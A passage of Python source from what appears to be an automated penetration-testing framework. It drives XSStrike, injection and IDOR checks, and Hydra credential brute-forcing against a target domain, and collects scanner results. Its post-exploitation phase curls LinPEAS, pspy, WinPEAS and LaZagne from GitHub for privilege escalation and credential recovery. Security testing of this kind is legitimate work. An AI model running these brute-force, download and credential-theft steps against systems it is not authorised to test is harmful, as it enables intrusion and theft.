                for url in urls_to_test[:max_urls]:
                    if '?' in url:
                        # URL with parameters - test directly
                        cmd = f"xsstrike -u {shlex.quote(url)} --blind 2>/dev/null"
                    else:
                        # No parameters - use crawl mode
                        cmd = f"xsstrike -u {shlex.quote(url)} --crawl -l 2 --blind 2>/dev/null"

                    ret, output = await self._run_command(cmd, timeout=120)
                    tested_count += 1

                    if ret == 0 and output:
                        # Sanitize output and remove duplicate lines
                        output = self._sanitize_tool_output(output)
                        # Remove duplicate consecutive lines
                        lines = output.split('\n')
                        unique_lines = []
                        prev_line = None
                        for line in lines:
                            if line.strip() != prev_line:
                                unique_lines.append(line)
                                prev_line = line.strip()
                        output = '\n'.join(unique_lines)
                        all_xsstrike_output.append(f"=== {url} ===\n{output}")

                        # Parse XSS findings
                        xss_count = output.lower().count("xss") + output.lower().count("reflection")
                        total_xss_count += xss_count

                        if xss_count > 0 or "vulnerable" in output.lower():
                            findings.append(Finding(
                                type="xss_vulnerability",
                                value="XSS Vulnerability Detected",
                                description=f"Cross-site scripting vulnerability at {url}",
                                severity="high",
                                phase="exploit",
                                tool="xsstrike",
                                target=url,
                                metadata={"xss_indicators": xss_count}
                            ))

                # Save combined output
                if all_xsstrike_output:
                    (self.output_dir / f"xsstrike_{self.domain}.txt").write_text("\n\n".join(all_xsstrike_output))
                    tools_run.append("xsstrike")

                self._log_tool(
                    f"xsstrike - tested {tested_count} URLs, {total_xss_count} potential XSS",
                    "done"
                )

            # 6. BOLA/IDOR Testing - Broken Object Level Authorization (NEW)
            self._log_tool("bola-test", "running")
            bola_findings = await self._test_bola_idor()
            if bola_findings:
                findings.extend(bola_findings)
                tools_run.append("bola-test")
                self._log_tool(f"bola-test - {len(bola_findings)} IDOR vulnerabilities found!", "done")
            else:
                self._log_tool("bola-test - no IDOR vulnerabilities detected", "done")

            # 6.5 SSRF Testing - Server-Side Request Forgery
            ssrf_findings = await self._test_ssrf()
            if ssrf_findings:
                findings.extend(ssrf_findings)
                tools_run.append("ssrf-test")
                self._log_tool(f"ssrf-test - {len(ssrf_findings)} SSRF vulnerabilities found!", "done")
            else:
                self._log_tool("ssrf-test - no SSRF vulnerabilities detected", "done")

            # 6.6 Path Traversal / LFI Testing
            lfi_findings = await self._test_path_traversal()
            if lfi_findings:
                findings.extend(lfi_findings)
                tools_run.append("lfi-test")
                self._log_tool(f"lfi-test - {len(lfi_findings)} LFI vulnerabilities found!", "done")
            else:
                self._log_tool("lfi-test - no LFI vulnerabilities detected", "done")

            # 6.7 Template Injection (SSTI) Testing
            ssti_findings = await self._test_template_injection()
            if ssti_findings:
                findings.extend(ssti_findings)
                tools_run.append("ssti-test")
                self._log_tool(f"ssti-test - {len(ssti_findings)} SSTI vulnerabilities found!", "done")
            else:
                self._log_tool("ssti-test - no SSTI vulnerabilities detected", "done")

            # 6.8 Host Header Injection Testing
            self._log_tool("host-header-injection", "running")
            hhi_findings = await self._test_host_header_injection()
            if hhi_findings:
                findings.extend(hhi_findings)
                tools_run.append("host-header-injection")
                self._log_tool(f"host-header-injection - {len(hhi_findings)} vulnerabilities found!", "done")
            else:
                self._log_tool("host-header-injection - no vulnerabilities detected", "done")

            # 6.9 CRLF Injection Testing
            self._log_tool("crlf-injection", "running")
            crlf_findings = await self._test_crlf_injection()
            if crlf_findings:
                findings.extend(crlf_findings)
                tools_run.append("crlf-injection")
                self._log_tool(f"crlf-injection - {len(crlf_findings)} vulnerabilities found!", "done")
            else:
                self._log_tool("crlf-injection - no vulnerabilities detected", "done")

            # 6.10 HTTP Parameter Pollution Testing
            self._log_tool("http-param-pollution", "running")
            hpp_findings = await self._test_http_parameter_pollution()
            if hpp_findings:
                findings.extend(hpp_findings)
                tools_run.append("http-param-pollution")
                self._log_tool(f"http-param-pollution - {len(hpp_findings)} vulnerabilities found!", "done")
            else:
                self._log_tool("http-param-pollution - no vulnerabilities detected", "done")

            # 6.11 Subdomain Takeover Detection
            self._log_tool("subdomain-takeover", "running")
            takeover_findings = await self._test_subdomain_takeover()
            if takeover_findings:
                findings.extend(takeover_findings)
                tools_run.append("subdomain-takeover")
                self._log_tool(f"subdomain-takeover - {len(takeover_findings)} vulnerabilities found!", "done")
            else:
                self._log_tool("subdomain-takeover - no vulnerabilities detected", "done")

            # 6.12 XXE (XML External Entity) Injection Testing
            self._log_tool("xxe-injection", "running")
            xxe_findings = await self._test_xxe()
            if xxe_findings:
                findings.extend(xxe_findings)
                tools_run.append("xxe-injection")
                self._log_tool(f"xxe-injection - {len(xxe_findings)} vulnerabilities found!", "done")
            else:
                self._log_tool("xxe-injection - no vulnerabilities detected", "done")

            # 6.13 CORS Misconfiguration Testing
            self._log_tool("cors-test", "running")
            cors_findings = await self._test_cors_misconfiguration()
            if cors_findings:
                findings.extend(cors_findings)
                tools_run.append("cors-test")
                self._log_tool(f"cors-test - {len(cors_findings)} vulnerabilities found!", "done")
            else:
                self._log_tool("cors-test - no CORS misconfigurations detected", "done")

            # 7. Hydra - Credential Brute-forcing (NEW)
            if "hydra" in self.config.exploit_tools:
                # Only run against discovered services with auth
                services_to_bruteforce = []

                # Check for SSH (port 22)
                if any("22/tcp" in str(f.value) for f in self.findings if f.type == "open_port"):
                    services_to_bruteforce.append(("ssh", 22))

                # Check for FTP (port 21)
                if any("21/tcp" in str(f.value) for f in self.findings if f.type == "open_port"):
                    services_to_bruteforce.append(("ftp", 21))

                # Check for HTTP Basic Auth
                if any("401" in str(f.value) for f in self.findings):
                    services_to_bruteforce.append(("http-get", 80))

                for service, port in services_to_bruteforce[:2]:  # Limit to 2 services
                    self._log_tool(f"hydra ({service})", "running")
                    ret, output = await self._run_command(
                        f"hydra -L {self.config.wordlist_users} -P {self.config.wordlist_passwords} "
                        f"-t {self.config.hydra_threads} -f -o {self.output_dir}/hydra_{service}.txt "
                        f"{self.safe_domain} {service} 2>/dev/null",
                        timeout=self.config.hydra_timeout
                    )
                    if ret == 0:
                        tools_run.append(f"hydra_{service}")

                        if "login:" in output.lower() or "password:" in output.lower():
                            findings.append(Finding(
                                type="credential_found",
                                value=f"Weak credentials on {service}",
                                description=f"Valid credentials found for {service} service",
                                severity="critical",
                                phase="exploit",
                                tool="hydra",
                                target=f"{self.domain}:{port}",
                                metadata={"service": service}
                            ))
                            self.config.shell_obtained = True

                        self._log_tool(f"hydra ({service}) - completed", "done")

            # 7. Searchsploit - Exploit Database Search (NEW)
            if "searchsploit" in self.config.exploit_tools:
                self._log_tool("searchsploit", "running")
                # Search for exploits based on discovered technologies
                search_terms = []

                # Get technologies from whatweb/httpx findings
                for f in self.findings:
                    if f.tool in ["whatweb", "httpx", "nmap"]:
                        # Extract potential software names
                        if "Apache" in f.value or "apache" in f.description:
                            search_terms.append("Apache")
                        if "nginx" in f.value.lower() or "nginx" in f.description.lower():
                            search_terms.append("nginx")
                        if "WordPress" in f.value or "wordpress" in f.description.lower():
                            search_terms.append("WordPress")

                search_terms = list(set(search_terms))[:3]  # Dedupe and limit

                for term in search_terms:
                    ret, output = await self._run_command(
                        f"searchsploit {shlex.quote(term)} --json 2>/dev/null | head -50"
                    )
                    if ret == 0 and output.strip():
                        try:
                            exploits = json.loads(output)
                            if exploits.get("RESULTS_EXPLOIT"):
                                (self.output_dir / f"searchsploit_{term}.json").write_text(output)
                                findings.append(Finding(
                                    type="potential_exploit",
                                    value=f"Exploits found for {term}",
                                    description=f"Found {len(exploits['RESULTS_EXPLOIT'])} potential exploits for {term}",
                                    severity="info",
                                    phase="exploit",
                                    tool="searchsploit",
                                    target=self.domain,
                                    metadata={"exploits": exploits["RESULTS_EXPLOIT"][:5]}
                                ))
                        except json.JSONDecodeError:
                            pass

                tools_run.append("searchsploit")
                self._log_tool("searchsploit - completed", "done")

        # ==================== SCANNER RESULT AGGREGATION ====================
        # Collect results from all enterprise scanners that were started

        # 8. Fetch Acunetix Results (always try to get partial results)
        if "acunetix" in self.scan_ids and not self.config.wait_for_scanners:
            self._log_tool("Fetching Acunetix Results", "running")
            try:
                acunetix = get_acunetix()
                status = acunetix.get_scan_status(self.scan_ids["acunetix"])

                # Always try to fetch vulnerabilities (even partial results)
                vulns = acunetix.get_scan_vulnerabilities(self.scan_ids["acunetix"])
                vuln_list = []
                for vuln in vulns:
                    findings.append(Finding(
                        type="vulnerability",
                        value=vuln.name,
                        description=vuln.description or vuln.name,
                        severity=vuln.severity,
                        phase="exploit",
                        tool="acunetix",
                        target=vuln.affected_url,
                        metadata={
                            "vuln_id": vuln.vuln_id,
                            "cvss": vuln.cvss_score
                        }
                    ))
                    # Collect for JSON output
                    vuln_list.append({
                        "vuln_id": vuln.vuln_id,
                        "name": vuln.name,
                        "severity": vuln.severity,
                        "description": vuln.description,
                        "affected_url": vuln.affected_url,
                        "cvss_score": vuln.cvss_score
                    })

                # Always update acunetix_scan.json with current results
                acunetix_json_path = self.output_dir / "acunetix_scan.json"
                acunetix_data = {}
                if acunetix_json_path.exists():
                    try:
                        acunetix_data = json.loads(acunetix_json_path.read_text())
                    except json.JSONDecodeError:
                        pass
                acunetix_data["status"] = status.status
                acunetix_data["progress"] = status.progress
                acunetix_data["vulnerabilities"] = vuln_list
                acunetix_data["vulnerability_count"] = len(vuln_list)
                acunetix_data["collected_at"] = datetime.now(timezone.utc).isoformat()
                acunetix_json_path.write_text(json.dumps(acunetix_data, indent=2))

                if vulns:
                    self._log_tool(f"Acunetix Results - {len(vulns)} vulnerabilities", "done")
                else:
                    self._log_tool(f"Acunetix - {status.status} ({status.progress}%) - no vulns yet", "done")
            except Exception as e:
                errors.append(f"Error fetching Acunetix results: {e}")

        # 9. Fetch Burp Suite Results (always try to get partial results)
        if "burp" in self.scan_ids and not self.config.wait_for_scanners:
            self._log_tool("Fetching Burp Suite Results", "running")
            try:
                burp = get_burp()
                status = burp.get_scan_status(self.scan_ids["burp"])

                # Always try to fetch issues (even partial results)
                issues = burp.get_scan_issues(self.scan_ids["burp"])
                issue_list = []
                for issue in issues:
                    sev = issue.severity.value if hasattr(issue.severity, 'value') else str(issue.severity)
                    findings.append(Finding(
                        type="vulnerability",
                        value=issue.name,
                        description=issue.description or issue.name,
                        severity=sev,
                        phase="exploit",
                        tool="burp",
                        target=issue.url,
                        metadata={
                            "issue_id": issue.serial_number,
                            "confidence": str(issue.confidence)
                        }
                    ))
                    issue_list.append({
                        "issue_id": issue.serial_number,
                        "name": issue.name,
                        "severity": sev,
                        "description": issue.description,
                        "url": issue.url,
                        "confidence": str(issue.confidence)
                    })

                # Always save burp_scan.json with current results
                burp_json_path = self.output_dir / "burp_scan.json"
                burp_data = {}
                if burp_json_path.exists():
                    try:
                        burp_data = json.loads(burp_json_path.read_text())
                    except json.JSONDecodeError:
                        pass
                burp_data["status"] = status.status
                burp_data["progress"] = status.progress
                burp_data["issues"] = issue_list
                burp_data["issue_count"] = len(issue_list)
                burp_data["collected_at"] = datetime.now(timezone.utc).isoformat()
                burp_json_path.write_text(json.dumps(burp_data, indent=2))

                if issues:
                    self._log_tool(f"Burp Suite Results - {len(issues)} issues", "done")
                else:
                    self._log_tool(f"Burp Suite - {status.status} ({status.progress}%) - no issues yet", "done")
            except Exception as e:
                errors.append(f"Error fetching Burp Suite results: {e}")

        # 10. Fetch Nessus Results (always try to get partial results)
        if "nessus" in self.scan_ids and not self.config.wait_for_scanners:
            self._log_tool("Fetching Nessus Results", "running")
            try:
                nessus = get_nessus()
                status = nessus.get_scan_status(self.scan_ids["nessus"])

                # Always try to fetch vulnerabilities (even partial results)
                vuln_list = []
                if status.status not in ["unreachable", "error"]:
                    vulns = nessus.get_vulnerabilities(self.scan_ids["nessus"])
                    for vuln in vulns:
                        findings.append(Finding(
                            type="vulnerability",
                            value=vuln.plugin_name,
                            description=vuln.description or vuln.plugin_name,
                            severity=vuln.severity_name,
                            phase="exploit",
                            tool="nessus",
                            target=f"{vuln.host}:{vuln.port}",
                            metadata={
                                "plugin_id": vuln.plugin_id,
                                "cvss": vuln.cvss_score,
                                "cve": vuln.cve
                            }
                        ))
                        vuln_list.append({
                            "plugin_id": vuln.plugin_id,
                            "plugin_name": vuln.plugin_name,
                            "severity": vuln.severity_name,
                            "description": vuln.description,
                            "host": vuln.host,
                            "port": vuln.port,
                            "cvss_score": vuln.cvss_score,
                            "cve": vuln.cve
                        })

                # Always save nessus_scan.json with current results
                nessus_json_path = self.output_dir / "nessus_scan.json"
                nessus_data = {}
                if nessus_json_path.exists():
                    try:
                        nessus_data = json.loads(nessus_json_path.read_text())
                    except json.JSONDecodeError:
                        pass
                nessus_data["status"] = status.status
                nessus_data["progress"] = status.progress
                nessus_data["vulnerabilities"] = vuln_list
                nessus_data["vulnerability_count"] = len(vuln_list)
                nessus_data["collected_at"] = datetime.now(timezone.utc).isoformat()
                nessus_json_path.write_text(json.dumps(nessus_data, indent=2))

                if vuln_list:
                    self._log_tool(f"Nessus Results - {len(vuln_list)} vulnerabilities", "done")
                else:
                    self._log_tool(f"Nessus - {status.status} ({status.progress}%) - no vulns yet", "done")
            except Exception as e:
                errors.append(f"Error fetching Nessus results: {e}")

        # 11. Fetch OWASP ZAP Results (always try to get partial results)
        if "zap" in self.scan_ids and not self.config.wait_for_scanners:
            self._log_tool("Fetching OWASP ZAP Results", "running")
            try:
                zap = get_zap()
                status = zap.get_scan_status(self.scan_ids["zap"])

                # Always try to fetch alerts (even partial results)
                alerts = zap.get_alerts(base_url=self.target)
                severity_map = {3: "high", 2: "medium", 1: "low", 0: "info"}
                alert_list = []
                for alert in alerts:
                    sev = severity_map.get(alert.risk, "info")
                    findings.append(Finding(
                        type="vulnerability",
                        value=alert.name,
                        description=alert.description or alert.name,
                        severity=sev,
                        phase="exploit",
                        tool="zap",
                        target=alert.url,
                        metadata={
                            "alert_id": alert.alert_id,
                            "cwe_id": alert.cwe_id,
                            "confidence": alert.confidence_name
                        }
                    ))
                    # Collect for JSON output
                    alert_list.append({
                        "alert_id": alert.alert_id,
                        "name": alert.name,
                        "severity": sev,
                        "risk": alert.risk,
                        "description": alert.description,
                        "url": alert.url,
                        "cwe_id": alert.cwe_id,
                        "confidence": alert.confidence_name
                    })

                # Always save zap_scan.json with current results
                zap_json_path = self.output_dir / "zap_scan.json"
                zap_data = {}
                if zap_json_path.exists():
                    try:
                        zap_data = json.loads(zap_json_path.read_text())
                    except json.JSONDecodeError:
                        pass
                zap_data["status"] = status.status if status.progress >= 100 else "running"
                zap_data["progress"] = status.progress
                zap_data["alerts"] = alert_list
                zap_data["alert_count"] = len(alert_list)
                zap_data["collected_at"] = datetime.now(timezone.utc).isoformat()
                zap_json_path.write_text(json.dumps(zap_data, indent=2))

                if alerts:
                    self._log_tool(f"OWASP ZAP Results - {len(alerts)} alerts", "done")
                else:
                    self._log_tool(f"OWASP ZAP - {status.progress}% - no alerts yet", "done")
            except Exception as e:
                errors.append(f"Error fetching OWASP ZAP results: {e}")

        # Add findings to global list
        for f in findings:
            self._add_finding(f)

        duration = time.time() - start_time
        result = PhaseResult(
            phase=phase,
            status="completed",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
            duration=duration,
            findings=findings,
            tools_run=tools_run,
            errors=errors
        )

        self.phase_results[phase] = result
        if self.on_phase_complete:
            self.on_phase_complete(result)

        return result

    # ==================== POST-EXPLOITATION PHASE (NEW) ====================

    async def run_post_exploit(self) -> PhaseResult:
        """
        Execute post-exploitation phase.

        This phase auto-triggers when shell access is obtained during exploitation.
        Runs privilege escalation tools to discover further attack paths.
        """
        phase = Phase.POST_EXPLOIT
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = time.time()
        findings = []
        tools_run = []
        errors = []

        if self.on_phase_start:
            self.on_phase_start(phase)

        self._log_phase(phase, f"Post-Exploitation on {self.domain}")

        # Check if shell access was obtained
        if not self.config.shell_obtained:
            self._log_tool("No shell access - skipping post-exploitation", "done")
            duration = time.time() - start_time
            result = PhaseResult(
                phase=phase,
                status="skipped",
                started_at=started_at,
                finished_at=datetime.now(timezone.utc).isoformat(),
                duration=duration,
                findings=[],
                tools_run=[],
                errors=[],
                metadata={"reason": "No shell access obtained during exploitation"}
            )
            self.phase_results[phase] = result
            return result

        # Determine target OS
        target_os = self.config.target_os or "linux"  # Default to linux
        self._log_tool(f"Target OS: {target_os}", "done")

        # ==================== LINUX POST-EXPLOITATION ====================
        if target_os == "linux":

            # 1. LinPEAS - Linux Privilege Escalation
            if "linpeas" in self.config.post_exploit_tools:
                self._log_tool("linpeas", "running")
                # Note: In real scenario, this would be uploaded and executed on target
                # For now, we simulate the check
                ret, output = await self._run_command(
                    f"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && echo 'Downloaded'",
                    timeout=60
                )
                if ret == 0 and "Downloaded" in output:
                    tools_run.append("linpeas")
                    findings.append(Finding(
                        type="post_exploit_tool",
                        value="LinPEAS ready",
                        description="LinPEAS privilege escalation script downloaded and ready for execution on target",
                        severity="info",
                        phase="post_exploit",
                        tool="linpeas",
                        target=self.domain,
                        metadata={"script_path": "/tmp/linpeas.sh"}
                    ))
                    self._log_tool("linpeas - downloaded", "done")

            # 2. pspy - Process Monitoring
            if "pspy" in self.config.post_exploit_tools:
                self._log_tool("pspy", "running")
                ret, output = await self._run_command(
                    f"curl -sL https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o /tmp/pspy64 2>/dev/null && chmod +x /tmp/pspy64 && echo 'Downloaded'",
                    timeout=60
                )
                if ret == 0 and "Downloaded" in output:
                    tools_run.append("pspy")
                    findings.append(Finding(
                        type="post_exploit_tool",
                        value="pspy ready",
                        description="pspy process monitor downloaded for cron job and process analysis",
                        severity="info",
                        phase="post_exploit",
                        tool="pspy",
                        target=self.domain,
                        metadata={"binary_path": "/tmp/pspy64"}
                    ))
                    self._log_tool("pspy - downloaded", "done")

        # ==================== WINDOWS POST-EXPLOITATION ====================
        elif target_os == "windows":

            # 1. WinPEAS - Windows Privilege Escalation
            if "winpeas" in self.config.post_exploit_tools:
                self._log_tool("winpeas", "running")
                ret, output = await self._run_command(
                    f"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o /tmp/winpeas.exe 2>/dev/null && echo 'Downloaded'",
                    timeout=60
                )
                if ret == 0 and "Downloaded" in output:
                    tools_run.append("winpeas")
                    findings.append(Finding(
                        type="post_exploit_tool",
                        value="WinPEAS ready",
                        description="WinPEAS privilege escalation tool downloaded for Windows target",
                        severity="info",
                        phase="post_exploit",
                        tool="winpeas",
                        target=self.domain,
                        metadata={"binary_path": "/tmp/winpeas.exe"}
                    ))
                    self._log_tool("winpeas - downloaded", "done")

            # 2. LaZagne - Credential Recovery
            if "lazagne" in self.config.post_exploit_tools:
                self._log_tool("lazagne", "running")
                ret, output = await self._run_command(
                    f"curl -sL https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -o /tmp/lazagne.exe 2>/dev/null && echo 'Downloaded'",
                    timeout=60
                )
                if ret == 0 and "Downloaded" in output:
                    tools_run.append("lazagne")
                    findings.append(Finding(
                        type="post_exploit_tool",
                        value="LaZagne ready",
                        description="LaZagne credential recovery tool downloaded for Windows target",
                        severity="info",
                        phase="post_exploit",
                        tool="lazagne",
                        target=self.domain,
                        metadata={"binary_path": "/tmp/lazagne.exe"}
                    ))
                    self._log_tool("lazagne - downloaded", "done")

        # 3. Generate Post-Exploitation Report
        post_exploit_report = {
            "target": self.domain,
            "target_os": target_os,
            "shell_obtained": self.config.shell_obtained,
            "tools_prepared": tools_run,
            "recommendations": [
                "Execute LinPEAS/WinPEAS on target for privilege escalation paths",
                "Run pspy to monitor for cron jobs and scheduled tasks",
                "Use LaZagne to recover stored credentials",
                "Check for kernel exploits based on version",
                "Look for SUID binaries (Linux) or service misconfigurations (Windows)"
            ]
        }
        (self.output_dir / "post_exploit_report.json").write_text(json.dumps(post_exploit_report, indent=2), encoding="utf-8")

        # Add findings to global list
        for f in findings:
            self._add_finding(f)

        duration = time.time() - start_time
        result = PhaseResult(
            phase=phase,
            status="completed",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
            duration=duration,
            findings=findings,
            tools_run=tools_run,
            errors=errors,
            metadata={
                "target_os": target_os,
                "shell_obtained": self.config.shell_obtained
            }
        )

        self.phase_results[phase] = result
        if self.on_phase_complete:
            self.on_phase_complete(result)

        return result

    # ==================== SCANNER RESULT COLLECTION ====================

    async def _collect_final_scanner_results(self) -> Dict[str, Any]:
        """
        Final aggregation of enterprise scanner results before report generation.

        This method polls all scanners that were started during the scan phase,
        optionally waits for them to complete, and collects all results into findings.

        Returns:
            Dict with scanner results summary
        """
        if not self.scan_ids:
            return {"status": "no_scanners", "message": "No enterprise scanners were started"}

        width = self._get_terminal_width() - 4
        print("\n" + "="*width)
        print("  📊 COLLECTING ENTERPRISE SCANNER RESULTS")
        print("="*width)

        results_summary = {
            "scanners_polled": list(self.scan_ids.keys()),
            "completed": [],
            "still_running": [],
            "failed": [],
            "total_findings_added": 0
        }

        findings_added = []

        # 1. Acunetix Results
        if "acunetix" in self.scan_ids:
            print(f"\n  ▸ Acunetix (scan_id: {self.scan_ids['acunetix'][:8]}...)")
            try:
                acunetix = get_acunetix()
                scan_id = self.scan_ids["acunetix"]

                # Poll until complete or timeout
                if self.config.wait_for_scanners:
                    timeout_end = time.time() + self.config.scanner_timeout
                    last_progress = -1
                    while time.time() < timeout_end:
                        status = acunetix.get_scan_status(scan_id)
                        if status.status == "completed":
                            self._finish_progress_bar("Acunetix", "completed")
                            break
                        # Only update if progress changed
                        if status.progress != last_progress:
                            self._print_progress_bar("Acunetix", status.progress)
                            last_progress = status.progress
                        await asyncio.sleep(self.config.scanner_poll_interval)
                    else:
                        self._finish_progress_bar("Acunetix", "timeout")
                        results_summary["still_running"].append("acunetix")
                        # Continue to collect partial results

                # Get final status
                status = acunetix.get_scan_status(scan_id)

                # Always try to fetch vulnerabilities (even partial results)
                # Acunetix may have found vulns even while scan is running
                vulns = acunetix.get_scan_vulnerabilities(scan_id)

                vuln_list = []
                for vuln in vulns:
                    finding = Finding(
                        type="vulnerability",
                        value=vuln.name,
                        description=vuln.description or vuln.name,
                        severity=vuln.severity,
                        phase="scan",
                        tool="acunetix",
                        target=vuln.affected_url,
                        metadata={"vuln_id": vuln.vuln_id, "cvss": vuln.cvss_score}
                    )
                    self._add_finding(finding)
                    findings_added.append(finding)
                    # Collect for JSON output
                    vuln_list.append({
                        "vuln_id": vuln.vuln_id,
                        "name": vuln.name,
                        "severity": vuln.severity,
                        "description": vuln.description,
                        "affected_url": vuln.affected_url,
                        "cvss_score": vuln.cvss_score
                    })

                if vulns:
                    print(f"    \033[92m✓ Found {len(vulns)} vulnerabilities\033[0m")
                else:
                    print(f"    \033[93m⚠ No vulnerabilities found yet (scan may still be running)\033[0m")

                # Always update acunetix_scan.json with current results
                acunetix_json_path = self.output_dir / "acunetix_scan.json"
                acunetix_data = {}
                if acunetix_json_path.exists():
                    try:
                        acunetix_data = json.loads(acunetix_json_path.read_text())
                    except json.JSONDecodeError:
                        pass
                acunetix_data["status"] = status.status
                acunetix_data["progress"] = status.progress
                acunetix_data["vulnerabilities"] = vuln_list
                acunetix_data["vulnerability_count"] = len(vuln_list)
                acunetix_data["collected_at"] = datetime.now(timezone.utc).isoformat()
                acunetix_json_path.write_text(json.dumps(acunetix_data, indent=2))

                if status.status == "completed":
                    results_summary["completed"].append("acunetix")
                elif "acunetix" not in results_summary["still_running"]:
                    results_summary["still_running"].append("acunetix")

            except Exception as e:
                print(f"    \033[91m✗ Error: {e}\033[0m")
                results_summary["failed"].append({"scanner": "acunetix", "error": str(e)})

        # 2. Burp Suite Results
        if "burp" in self.scan_ids:
            print(f"\n  ▸ Burp Suite (scan_id: {self.scan_ids['burp'][:8]}...)")
            try:
                burp = get_burp()
                scan_id = self.scan_ids["burp"]

                # Poll until complete or timeout
                if self.config.wait_for_scanners:
                    timeout_end = time.time() + self.config.scanner_timeout
                    last_progress = -1
                    while time.time() < timeout_end:
                        status = burp.get_scan_status(scan_id)
                        if status.status == "completed":
                            self._finish_progress_bar("Burp", "completed")
                            break
                        if status.progress != last_progress:
                            self._print_progress_bar("Burp", status.progress)
                            last_progress = status.progress
                        await asyncio.sleep(self.config.scanner_poll_interval)
                    else:
                        self._finish_progress_bar("Burp", "timeout")
                        results_summary["still_running"].append("burp")

                # Get final status
                status = burp.get_scan_status(scan_id)

                # Always try to get issues (even partial results)
                issues = burp.get_scan_issues(scan_id)

                issue_list = []
                for issue in issues:
                    sev = issue.severity.value if hasattr(issue.severity, 'value') else str(issue.severity)
                    finding = Finding(
                        type="vulnerability",
                        value=issue.name,
                        description=issue.description or issue.name,
                        severity=sev,
                        phase="scan",
                        tool="burp",
                        target=issue.url,
                        metadata={"issue_id": issue.serial_number, "confidence": str(issue.confidence)}
                    )
                    self._add_finding(finding)
                    findings_added.append(finding)
                    # Collect for JSON output
                    issue_list.append({
                        "issue_id": issue.serial_number,
                        "name": issue.name,
                        "severity": sev,
                        "description": issue.description,
                        "url": issue.url,
                        "confidence": str(issue.confidence)
                    })

                if issues:
                    print(f"    \033[92m✓ Found {len(issues)} issues\033[0m")
                else:
                    print(f"    \033[93m⚠ No issues found yet (scan may still be running)\033[0m")

                # Always save burp_scan.json with current results
                burp_json_path = self.output_dir / "burp_scan.json"
                burp_data = {
                    "scan_id": scan_id,
                    "target": self.target,
                    "status": status.status,
                    "progress": status.progress,
                    "issues": issue_list,
                    "issue_count": len(issue_list),
                    "collected_at": datetime.now(timezone.utc).isoformat()
                }
                burp_json_path.write_text(json.dumps(burp_data, indent=2))

                if status.status == "completed":
                    results_summary["completed"].append("burp")
                elif "burp" not in results_summary["still_running"]:
                    results_summary["still_running"].append("burp")

            except Exception as e:
                print(f"    \033[91m✗ Error: {e}\033[0m")
                results_summary["failed"].append({"scanner": "burp", "error": str(e)})

        # 3. Nessus Results
        if "nessus" in self.scan_ids:
            print(f"\n  ▸ Nessus (scan_id: {self.scan_ids['nessus']})")
            try:
                nessus = get_nessus()
                scan_id = self.scan_ids["nessus"]

                # Poll until complete or timeout
                if self.config.wait_for_scanners:
                    timeout_end = time.time() + self.config.scanner_timeout
                    consecutive_failures = 0
                    last_progress = -1
                    while time.time() < timeout_end:
                        status = nessus.get_scan_status(scan_id, silent=True)
                        if status.status == "completed":
                            self._finish_progress_bar("Nessus", "completed")
                            break
                        if status.status == "unreachable":
                            consecutive_failures += 1
                            if consecutive_failures >= 3:
                                self._finish_progress_bar("Nessus", "Server unreachable")
                                break
                            await asyncio.sleep(self.config.scanner_poll_interval * 2)
                            continue
                        consecutive_failures = 0
                        if status.progress != last_progress:
                            self._print_progress_bar("Nessus", status.progress)
                            last_progress = status.progress
                        await asyncio.sleep(self.config.scanner_poll_interval)
                    else:
                        self._finish_progress_bar("Nessus", "timeout")
                        results_summary["still_running"].append("nessus")

                # Get final status (with single retry for flaky connections)
                status = nessus.get_scan_status(scan_id, silent=True)
                if status.status == "unreachable":
                    results_summary["failed"].append({"scanner": "nessus", "error": "Server unreachable"})

                # Always try to get vulnerabilities if server is reachable (even partial results)
                vuln_list = []
                if status.status not in ["unreachable", "error"]:
                    vulns = nessus.get_vulnerabilities(scan_id)

                    for vuln in vulns:
                        finding = Finding(
                            type="vulnerability",
                            value=vuln.plugin_name,
                            description=vuln.description or vuln.plugin_name,
                            severity=vuln.severity_name,
                            phase="scan",
                            tool="nessus",
                            target=f"{vuln.host}:{vuln.port}",
                            metadata={"plugin_id": vuln.plugin_id, "cvss": vuln.cvss_score, "cve": vuln.cve}
                        )
                        self._add_finding(finding)
                        findings_added.append(finding)
                        # Collect for JSON output
                        vuln_list.append({
                            "plugin_id": vuln.plugin_id,
                            "plugin_name": vuln.plugin_name,
                            "severity": vuln.severity_name,
                            "description": vuln.description,
                            "host": vuln.host,
                            "port": vuln.port,
                            "cvss_score": vuln.cvss_score,
                            "cve": vuln.cve
                        })

                    if vulns:
                        print(f"    \033[92m✓ Found {len(vulns)} vulnerabilities\033[0m")
                    else:
                        print(f"    \033[93m⚠ No vulnerabilities found yet (scan may still be running)\033[0m")

                # Always save nessus_scan.json with current results
                nessus_json_path = self.output_dir / "nessus_scan.json"
                nessus_data = {
                    "scan_id": scan_id,
                    "target": self.target,
                    "status": status.status,
                    "progress": status.progress,
                    "vulnerabilities": vuln_list,
                    "vulnerability_count": len(vuln_list),
                    "collected_at": datetime.now(timezone.utc).isoformat()
                }
                nessus_json_path.write_text(json.dumps(nessus_data, indent=2))

                if status.status == "completed":
                    results_summary["completed"].append("nessus")
                elif "nessus" not in results_summary["still_running"]:
                    results_summary["still_running"].append("nessus")

            except Exception as e:
                print(f"    \033[91m✗ Error: {e}\033[0m")
                results_summary["failed"].append({"scanner": "nessus", "error": str(e)})

        # 4. OWASP ZAP Results
        if "zap" in self.scan_ids:
            print(f"\n  ▸ OWASP ZAP (scan_id: {self.scan_ids['zap']})")
            try:
                zap = get_zap()
                scan_id = self.scan_ids["zap"]

                # Poll until complete or timeout
                if self.config.wait_for_scanners:
                    timeout_end = time.time() + self.config.scanner_timeout
                    last_progress = -1
                    while time.time() < timeout_end:
                        status = zap.get_scan_status(scan_id)
                        if status.progress >= 100 or status.status == "completed":
                            self._finish_progress_bar("ZAP", "completed")
                            break
                        if status.progress != last_progress:
                            self._print_progress_bar("ZAP", status.progress)
                            last_progress = status.progress
                        await asyncio.sleep(self.config.scanner_poll_interval)
                    else:
                        self._finish_progress_bar("ZAP", "timeout")
                        results_summary["still_running"].append("zap")

                # Get final status
                status = zap.get_scan_status(scan_id)

                # Always try to get alerts (even partial results)
                alerts = zap.get_alerts(base_url=self.target)

